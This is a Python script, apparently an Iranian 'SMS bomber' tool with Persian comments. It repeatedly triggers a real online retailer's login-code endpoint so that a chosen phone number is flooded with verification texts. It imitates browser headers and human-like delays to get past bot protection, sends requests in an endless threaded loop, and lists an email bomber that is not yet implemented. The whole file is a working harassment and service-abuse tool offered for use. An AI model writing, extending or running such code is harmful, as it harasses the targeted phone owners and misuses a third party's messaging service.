from platform import node, system, release
from os import system as os_system, name
from re import match, sub
from threading import Thread
import urllib3
from time import sleep
import random
import socket

# ------------------------------
# Imports & Setup
# ------------------------------
urllib3.disable_warnings()

try:
    from requests import get, post
except ImportError:
    os_system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'
g = '\033[32;1m'
y = '\033[33;1m'
b = '\033[34;1m'
p = '\033[35;1m'
w = '\033[37;1m'
a = '\033[0m'
d = '\033[90;1m'

# System info
Node, System, Release = node(), system(), release()

# ------------------------------
# Helpers
# ------------------------------
def clear_screen():
    os_system('clear' if name == 'posix' else 'cls')

def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS Service
# ------------------------------
def khanoumi(phone):
    import requests
    import time
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://accounts.khanoumi.com/api/nim/v1/account/login/init"
    
    payload = {"phone": formatted_phone}
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://accounts.khanoumi.com",
        "Referer": "https://accounts.khanoumi.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Connection": "keep-alive",
        "X-l": "niam"
    }
    
    try:
        # ایجاد session برای مدیریت cookies
        session = requests.Session()
        
        # اول یک درخواست GET به صفحه اصلی بزنیم تا cookies تنظیم شوند
        session.get("https://accounts.khanoumi.com/", headers=headers, timeout=10)
        time.sleep(2)  # تاخیر برای شبیه‌سازی رفتار انسانی
        
        # حالا درخواست اصلی
        response = session.post(url, json=payload, headers=headers, timeout=15)
        
        print(f'{g}[+] Status Code: {response.status_code}{a}')
        print(f'{g}[+] Response Length: {len(response.text)} characters{a}')
        
        # بررسی نوع پاسخ
        if response.status_code == 200:
            if response.text.strip().startswith('{') and 'application/json' in response.headers.get('content-type', ''):
                try:
                    response_data = response.json()
                    if response_data.get("data"):
                        print(f'{g}(khanoumi) {a}Code Sent Successfully!')
                        return True
                    else:
                        print(f'{r}[-] (khanoumi) Invalid response structure{a}')
                        return False
                except ValueError:
                    print(f'{r}[-] (khanoumi) Could not parse JSON (Cloudflare protection?){a}')
                    return False
            else:
                print(f'{r}[-] (khanoumi) Cloudflare protection detected!{a}')
                return False
        else:
            print(f'{r}[-] (khanoumi) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] khanoumi Exception: {e}{a}')
        return False



# ------------------------------
# Service Runner
# ------------------------------
def send_service_safe(service, phone):
    result = service(phone)
    if result:
        print(f"{g}[+] {service.__name__}: Code Sent!{a}")
    else:
        print(f"{y}[-] {service.__name__}: Failed or No Response{a}")

# ------------------------------
# SMS Bomber
# ------------------------------
def Vip(phone, Time):
    services = [khanoumi]  # فقط سرویس khanoumi
    total_services = len(services)

    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        clear_screen()

# ------------------------------
# Phone validation
# ------------------------------
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# ------------------------------
# Menu
# ------------------------------
def main_menu():
    clear_screen()
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-2): {a}")

# ------------------------------
# Main Loop
# ------------------------------
def main():
    while True:
        choice = main_menu()
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Email Bomber is not implemented yet.")

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break

        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

# ------------------------------
# Entry Point
# ------------------------------
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection detected!{a}")
    else:
        main()
